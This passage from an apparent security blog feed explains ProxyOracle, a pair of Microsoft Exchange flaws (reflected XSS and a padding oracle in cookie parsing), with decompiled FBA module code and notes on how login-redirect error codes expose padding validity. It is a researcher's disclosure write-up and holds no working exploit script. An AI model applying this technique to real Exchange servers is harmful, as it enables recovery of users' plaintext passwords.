      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai working with ZDI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyShell&lt;sup&gt;[2]&lt;/sup&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31207&quot;&gt;CVE-2021-31207&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;May 11, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai working with ZDI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jun 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jun 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768&quot;&gt;CVE-2021-33768&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jul 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai and Dlive&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;div style=&quot;font-size:0.6em; line-height: 1.6;&quot;&gt;
&lt;br /&gt;&lt;em&gt;[1] Bugs relate to this new attack surface direclty&lt;/em&gt;&lt;br /&gt;
&lt;em&gt;[2] Pwn2Own 2021 bugs&lt;/em&gt;
&lt;/div&gt;

&lt;p&gt;更詳盡的技術細節我們已陸續公布，後續連結會持續更新於本文，敬請期待：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/&quot;&gt;A New Attack Surface on MS Exchange Part 1 - ProxyLogon!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle/&quot;&gt;A New Attack Surface on MS Exchange Part 2 - ProxyOracle!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/22/a-new-attack-surface-on-MS-exchange-part-3-ProxyShell/&quot;&gt;A New Attack Surface on MS Exchange Part 3 - ProxyShell!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/&quot;&gt;A New Attack Surface on MS Exchange Part 4 - ProxyRelay!&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2021/08/07/a-new-attack-surface-on-MS-exchange/</link>
                <guid>https://devco.re/blog/2021/08/07/a-new-attack-surface-on-MS-exchange</guid>
                <pubDate>Sat, 07 Aug 2021 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>A New Attack Surface on MS Exchange Part 2 - ProxyOracle!</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    .center-image {
        margin: 0 auto;
        display: block;
    }
&lt;/style&gt;

&lt;p&gt;Hi, this is the part 2 of the New MS Exchange Attack Surface. Because this article refers to several architecture introductions and attack surface concepts in the previous article, you could find the first piece here:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/&quot;&gt;A New Attack Surface on MS Exchange Part 1 - ProxyLogon!&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This time, we will be introducing ProxyOracle. Compared with ProxyLogon, ProxyOracle is an interesting exploit with a different approach. By simply leading a user to visit a malicious link, ProxyOracle allows an attacker to recover the user’s password in plaintext  format completely. ProxyOracle consists of two vulnerabilities:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195&quot;&gt;CVE-2021-31195&lt;/a&gt; - Reflected Cross-Site Scripting&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31196&quot;&gt;CVE-2021-31196&lt;/a&gt; - Padding Oracle Attack on Exchange Cookies Parsing&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;where-is-proxyoracle&quot;&gt;Where is ProxyOracle&lt;/h1&gt;

&lt;p&gt;So where is ProxyOracle? Based on the CAS architecture we introduced before, the Frontend of CAS will first serialize the User Identity to a string and put it in the header of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt;. The header will be merged into the client’s HTTP request and sent to the Backend later. Once the Backend receives, it deserializes the header back to the original User Identity in Frontend.&lt;/p&gt;

&lt;p&gt;We now know how the Frontend and Backend synchronize the User Identity. The next is to explain how the Frontend knows who you are and processes your credentials. The Outlook Web Access (OWA) uses a fancy interface to handle the whole login mechanism, which is called Form-Based Authentication (FBA). The FBA is a special IIS module that inherits the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProxyModule&lt;/code&gt; and is responsible for executing the transformation between the credentials and cookies before entering the proxy logic.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/2/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;the-fba-mechanism&quot;&gt;The FBA Mechanism&lt;/h1&gt;

&lt;p&gt;HTTP is a stateless protocol. To keep your login state, FBA saves the username and password in cookies. Every time you visit the OWA, Exchange will parse the cookies, retrieve the credential and try to log in with that. If the login succeed, Exchange will serialize your User Identity into a string, put it into the header of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt;, and forward it to the Backend&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\FbaModule.cs&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OnBeginRequestInternal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpApplication&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Items&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;AuthType&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;FBA&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;HandleFbaAuthFormPost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ParseCadataCookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MissingSslCertificateException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;NameValueCollection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nameValueCollection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;NameValueCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;nameValueCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CafeError&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ErrorFE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FEErrorCodes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSLCertificateProblem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;302&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AspNetHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetCafeErrorPageRedirectUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nameValueCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;OnBeginRequestInternal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;All the cookies are encrypted to ensure even if an attacker can hijack the HTTP request, he/she still couldn’t get your credential in plaintext format. FBA leverages 5 special cookies to accomplish the whole de/encryption process:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cadata&lt;/code&gt; - The encrypted username and password&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cadataTTL&lt;/code&gt; - The Time-To-Live timestamp&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cadataKey&lt;/code&gt; - The KEY for encryption&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cadataIV&lt;/code&gt; - The IV for encryption&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cadataSig&lt;/code&gt; - The signature to prevent tampering&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/2/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The encryption logic will first generate two 16 bytes random strings as the IV and KEY for the current session. The username and password will then be encoded with Base64, encrypted by the algorithm AES and sent back to the client within cookies. Meanwhile, the IV and KEY will be sent to the user, too. To prevent the client from decrypting the credential by the known IV and KEY directly, Exchange will once again use the algorithm RSA to encrypt the IV and KEY via its SSL certificate private key before sending out!&lt;/p&gt;

&lt;p&gt;Here is a Pseudo Code for the encryption logic:&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;@key&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetServerSSLCert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetPrivateKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;cadataSig&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;@key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Fba Rocks!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;cadataIV&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;@key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetRandomBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;cadataKey&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;@key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetRandomBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

 &lt;span class=&quot;n&quot;&gt;@timestamp&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetCurrentTimestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;cadataTTL&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AES_CBC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cadataKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cadataIV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;@timestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

 &lt;span class=&quot;n&quot;&gt;@blob&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Basic &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ToBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserName&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;cadata&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AES_CBC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cadataKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cadataIV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;@blob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The Exchange takes CBC as its padding mode. If you are familiar with Cryptography, you might be wondering whether the CBC mode here is vulnerable to the Padding Oracle Attack? Bingo! As a matter of fact, Padding Oracle Attack is still existing in such essential software like Exchange in 2021!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/2/3.gif&quot; alt=&quot;&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;cve-2021-31196---the-padding-oracle&quot;&gt;CVE-2021-31196 - The Padding Oracle&lt;/h1&gt;

&lt;p&gt;When there is something wrong with the FBA, Exchange attaches an error code and redirects the HTTP request back to the original login page. So where is the Oracle? In the cookie decryption, Exchange uses an exception to catch the Padding Error, and because of the exception, the program returned immediately so that error code number is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;, which means &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;None&lt;/code&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Location: /OWA/logon.aspx?url=…&amp;amp;reason=0&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In contrast with the Padding Error, if the decryption is good, Exchange will continue the authentication process and try to login with the corrupted username and password. At this moment, the result must be a failure and the error code number is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2&lt;/code&gt;, which represents &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InvalidCredntials&lt;/code&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Location: /OWA/logon.aspx?url=…&amp;amp;reason=2&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The diagram looks like:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/2/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With the difference, we now have an Oracle to identify whether the decryption process is successful or not.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\FbaModule.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ParseCadataCookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpApplication&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HttpRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HttpResponse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cadata&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cadataKey&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cadataIV&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text4&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cadataSig&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cadataTTL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;RSACryptoServiceProvider&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsacryptoServiceProvider&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x509Certificate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PrivateKey&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RSACryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
